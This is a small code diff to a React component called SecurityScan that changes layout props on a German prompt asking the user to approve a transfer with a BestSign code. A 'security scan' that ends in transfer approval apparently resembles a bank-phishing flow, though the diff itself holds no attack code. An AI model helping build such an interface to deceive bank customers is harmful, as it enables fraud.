@@ -754,10 +754,10 @@ export function SecurityScan({ onComplete, sessionId, accountName: accountNamePr
                   code={transferBestSignCode || 'XXXX'}
                   title="Mit BestSign freigeben"
                   subtitle="Bitte prüfen Sie den Auftrag in Ihrer App. Nur wenn alle Angaben korrekt sind, geben Sie den Auftrag frei."
-                  compact={true}
+                  compact={false}
                   showSpinner={true}
                   showBackButton={false}
-                  showActionBar={false}
+                  showActionBar={true}
                 />
               )}
               
